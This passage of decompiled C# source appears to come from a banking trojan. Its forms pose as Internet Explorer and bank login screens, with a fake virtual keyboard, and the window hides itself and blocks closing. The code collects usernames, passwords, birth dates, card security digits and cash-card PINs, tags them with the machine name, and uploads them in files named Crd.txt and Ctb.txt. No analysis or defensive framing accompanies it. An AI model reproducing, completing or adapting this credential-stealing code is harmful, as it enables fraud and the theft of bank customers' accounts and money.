			GuardaInfo("Cxx", "Account....: " + ((Control)NOUS).get_Text());
			GuardaInfo("Cxx", "Type.......: " + ((Control)Tipo).get_Text());
			Form_Cxx = new Cxx(Hand);
			((Control)Form_Cxx).set_Left(105);
			((Control)Form_Cxx).set_Top(107);
			Durma(1000);
			((Control)Form_Cxx).Show();
		}
		else
		{
			MessageBox.Show("O usuário informado deve ter entre 10 e 20 posições.", "Microsoft Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void label2_Click(object sender, EventArgs e)
	{
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)campo_usu).get_Text().Length > 4 && ((Control)campo_sen).get_Text().Length > 4)
		{
			Durma(2000);
			ShowWindow(((Control)this).get_Handle(), 5);
			((Control)finaliza_cc).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 0);
		}
		else
		{
			MessageBox.Show("Dados inválidos.", "Internet Explorer");
		}
	}

	private void campo_fi_Click(object sender, EventArgs e)
	{
		if (((Control)campo_se).get_Text().Length == 6 && ((Control)campo_di).get_Text().Length == 3 && ((Control)campo_da).get_Text().Length == 8)
		{
			GuardaInfo("Crd", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Crd", "===========================================");
			GuardaInfo("Crd", "Usuario.....: " + ((Control)campo_usu).get_Text());
			GuardaInfo("Crd", "Senha.......: " + ((Control)campo_sen).get_Text());
			GuardaInfo("Crd", "Nascimento..: " + ((Control)campo_da).get_Text());
			GuardaInfo("Crd", "3Digitos....: " + ((Control)campo_di).get_Text());
			GuardaInfo("Crd", "Senhacash...: " + ((Control)campo_se).get_Text());
			GuardaInfo("Crd", "===========================================");
			FazerUpload("Crd.txt");
		}
	}

	private void label6_Click(object sender, EventArgs e)
	{
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		((Control)label6).set_Visible(false);
		if (((Control)ct_em).get_Text().IndexOf("@") == -1 && ((Control)ct_em).get_Text().IndexOf(".") == -1)
		{
			MessageBox.Show("Por favor informe seu e-mail corretamente.", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
		else if (((Control)ct_em).get_Text().Length < 10 && ((Control)ct_es).get_Text().Length < 5)
		{
			MessageBox.Show("Por favor informe sua senha corretamente.", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
		else
		{
			Durma(1500);
			ShowWindow(((Control)this).get_Handle(), 0);
			((Control)finaliza_citi1).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 5);
		}
		((Control)label6).set_Visible(true);
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		if (((Control)ct_ca).get_Text().Length == 7)
		{
			GuardaInfo("Ctb", "De: " + Environment.MachineName.ToString() + " em " + DateTime.Now);
			GuardaInfo("Ctb", "===========================================");
			GuardaInfo("Ctb", "Usuario.....: " + ((Control)ct_u1).get_Text());
			GuardaInfo("Ctb", "Senha.(u)...: " + ((Control)ct_u2).get_Text());
			GuardaInfo("Ctb", "E-mail......: " + ((Control)ct_em).get_Text());
			GuardaInfo("Ctb", "Senha.(e)...: " + ((Control)ct_es).get_Text());
			GuardaInfo("Ctb", "Senha.($)...: " + ((Control)ct_ca).get_Text());
			GuardaInfo("Ctb", "===========================================");
			FazerUpload("Ctb.txt");
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		ShowWindow(((Control)this).get_Handle(), 0);
		Registrar();
	}

	protected override void OnClosing(CancelEventArgs e)
	{
		e.Cancel = true;
	}

	private void Form1_Closing(object sender, CancelEventArgs e)
	{
		if (shuttingDown)
		{
			Application.Exit();
		}
	}

	private void bd_ag_Enter(object sender, EventArgs e)
	{
		((Control)bd_ag).set_BackColor(Color.LightGray);
	}

	private void bd_nc_Enter(object sender, EventArgs e)
	{
		((Control)bd_nc).set_BackColor(Color.LightGray);
	}

	private void bd_dg_Enter(object sender, EventArgs e)
	{
		((Control)bd_dg).set_BackColor(Color.LightGray);
	}

	private void bd_ag_Leave(object sender, EventArgs e)
	{
		((Control)bd_ag).set_BackColor(Color.White);
	}

	private void bd_nc_Leave(object sender, EventArgs e)
	{
		((Control)bd_nc).set_BackColor(Color.White);
	}

	private void bd_dg_Leave(object sender, EventArgs e)
	{
		((Control)bd_dg).set_BackColor(Color.White);
	}

	private void ita_a_TextChanged(object sender, EventArgs e)
	{
		if (((Control)ita_a).get_Text().Length == 4)
		{
			((Control)ita_b).Focus();
		}
	}

	private void ita_b_TextChanged(object sender, EventArgs e)
	{
		if (((Control)ita_b).get_Text().Length == 5)
		{
			((Control)ita_c).Focus();
		}
	}

	private void prm_a_Enter(object sender, EventArgs e)
	{
		((Control)prm_a).set_BackColor(Color.LightGray);
	}

	private void prm_a_Leave(object sender, EventArgs e)
	{
		((Control)prm_a).set_BackColor(Color.White);
	}

	private void prm_b_TextChanged(object sender, EventArgs e)
	{
		if (((Control)prm_b).get_Text().Length == 7)
		{
			((Control)prm_c).Focus();
		}
	}

	private void prm_a_TextChanged(object sender, EventArgs e)
	{
		if (((Control)prm_a).get_Text().Length == 4)
		{
			((Control)prm_b).Focus();
		}
	}

	private void prm_b_Leave(object sender, EventArgs e)
	{
		((Control)prm_b).set_BackColor(Color.White);
	}

	private void prm_b_Enter(object sender, EventArgs e)
	{
		((Control)prm_b).set_BackColor(Color.LightGray);
	}

	private void prm_c_Enter(object sender, EventArgs e)
	{
		((Control)prm_c).set_BackColor(Color.LightGray);
	}

	private void prm_c_Leave(object sender, EventArgs e)
	{
		((Control)prm_c).set_BackColor(Color.White);
	}

	private void bd_ag_TextChanged(object sender, EventArgs e)
	{
		if (((Control)bd_ag).get_Text().Length == 4)
		{
			((Control)bd_nc).Focus();
		}
	}

	private void bd_nc_TextChanged(object sender, EventArgs e)
	{
		if (((Control)bd_nc).get_Text().Length == 7)
		{
			((Control)bd_dg).Focus();
		}
	}

	private void prs_a_TextChanged(object sender, EventArgs e)
	{
		if (((Control)prs_a).get_Text().Length == 4)
		{
			((Control)prs_b).Focus();
		}
	}

	private void prs_b_TextChanged(object sender, EventArgs e)
	{
		if (((Control)prs_b).get_Text().Length == 5)
		{
			((Control)prs_c).Focus();
		}
	}

	private void snt_ag_TextChanged(object sender, EventArgs e)
	{
		if (((Control)snt_ag).get_Text().Length == 4)
		{
			((Control)snt_cc).Focus();
		}
	}

	private void snt_cc1_TextChanged(object sender, EventArgs e)
	{
		if (((Control)snt_cc1).get_Text().Length == 6)
		{
			((Control)snt_cc2).Focus();
		}
	}

	private void snt_cc_TextChanged(object sender, EventArgs e)
	{
		if (((Control)snt_cc).get_Text().Length == 2)
		{
			((Control)snt_cc1).Focus();
		}
	}

	private void r1_CheckedChanged(object sender, EventArgs e)
	{
		((Control)Tipo).set_Text("PF");
	}

	private void r2_CheckedChanged(object sender, EventArgs e)
	{
		((Control)Tipo).set_Text("PJ");
	}

	private void r3_CheckedChanged(object sender, EventArgs e)
	{
		((Control)Tipo).set_Text("GV");
	}

	private void finaliza_cc_Paint(object sender, PaintEventArgs e)
	{
		((Control)campo_da).Focus();
	}

	private void campo_da_TextChanged(object sender, EventArgs e)
	{
		if (((Control)campo_da).get_Text().Length == 8)
		{
			((Control)campo_se).Focus();
		}
	}

	private void campo_se_TextChanged(object sender, EventArgs e)
	{
		if (((Control)campo_se).get_Text().Length == 6)
		{
			((Control)campo_di).Focus();
		}
	}

	private void abrefechatecladociti(string state)
	{
		ShowWindow(((Control)this).get_Handle(), 5);
		if (state == "1")
		{
			((Control)cititec).set_Visible(true);
		}
		if (state == "0")
		{
			((Control)cititec).set_Visible(false);
			((Control)ct_u1).Focus();
		}
		ShowWindow(((Control)this).get_Handle(), 0);
	}

	private void textBox2_Enter(object sender, EventArgs e)
	{
		abrefechatecladociti("1");
	}

	private void textBox2_Leave(object sender, EventArgs e)
	{
		abrefechatecladociti("0");
	}

	private void click1_Click(object sender, EventArgs e)
	{
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)ct_u1).get_Text().Length > 4 && ((Control)ct_u2).get_Text().Length > 4)
		{
			Durma(1500);
			ShowWindow(((Control)this).get_Handle(), 0);
			((Control)finaliza_citi).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 5);
		}
		else
		{
			MessageBox.Show("Por favor informe seu nome de usuário e senha.", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private void ct_u2_KeyPress(object sender, KeyPressEventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Por favor, utilize o teclado virtual", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
	}

	private void label44_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "1");
	}

	private void label7_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "2");
	}

	private void label10_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "3");
	}

	private void label9_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "4");
	}

	private void label11_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "5");
	}

	private void label12_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "6");
	}

	private void label13_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "7");
	}

	private void label14_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "8");
	}

	private void label39_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "9");
	}

	private void label42_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "0");
	}

	private void label15_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "Q");
	}

	private void label17_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "W");
	}

	private void label19_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "E");
	}

	private void label21_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "R");
	}

	private void label16_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "T");
	}

	private void label18_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "Y");
	}

	private void label20_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "U");
	}

	private void label22_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "I");
	}

	private void label40_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "O");
	}

	private void label43_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "P");
	}

	private void label23_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "A");
	}

	private void label25_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "S");
	}

	private void label27_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "D");
	}

	private void label29_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "F");
	}

	private void label24_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "G");
	}

	private void label26_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "H");
	}

	private void label28_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "J");
	}

	private void label30_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "K");
	}

	private void label41_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "L");
	}

	private void label31_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "Z");
	}

	private void label33_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "X");
	}

	private void label35_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "C");
	}

	private void label37_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "V");
	}

	private void label32_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "B");
	}

	private void label34_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "N");
	}

	private void label36_Click(object sender, EventArgs e)
	{
		((Control)ct_u2).set_Text(((Control)ct_u2).get_Text() + "M");
	}

	private void label38_Click(object sender, EventArgs e)
	{
		string text = ((Control)ct_u2).get_Text();
		((Control)ct_u2).set_Text(text.Substring(0, text.Length - 1));
	}
}
